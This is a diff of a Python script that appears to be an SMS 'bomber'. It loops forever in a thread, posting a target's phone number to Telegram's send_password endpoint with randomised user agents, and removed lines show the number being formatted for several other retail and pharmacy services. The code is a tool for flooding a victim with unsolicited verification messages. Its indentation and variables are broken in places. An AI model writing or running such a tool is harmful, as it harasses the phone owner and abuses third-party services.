@@ -24,23 +24,23 @@ for x in range(12):
 	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
 	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
 
+def _sms(phone):
+    global x, y
+    user = fake_useragent.UserAgent().random
+    headers1 = {'user_agent': user}
+    print(Fore.YELLOW)
+
+    effect(message22)
 
 def infinity():
 	while True:
-		request_timeout = 0.00001
-		_phone = phone
-		_phone9 = _phone[1:]
-		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] 
-		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] 
-		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] 
-		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
-		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
+	
 		
-	try:
-			requests.post('https://my.telegram.org/auth/send_password', data={'phone': _phone})
-			print('[+] Beltelcom отправлено!')
-		except:
-			print('[-] Не отправлено!')
+	 try:
+            x += 1
+            a = requests.post("https://my.telegram.org/auth/send_password",
+            data={"phone": "+" + phone}, headers=headers1, timeout=5.05)
+            print('\n        [\033[32m+\033[33m] сообщение от telegram отправлено!')
 			
 countT = Thread(target=infinity)
 countT.start()
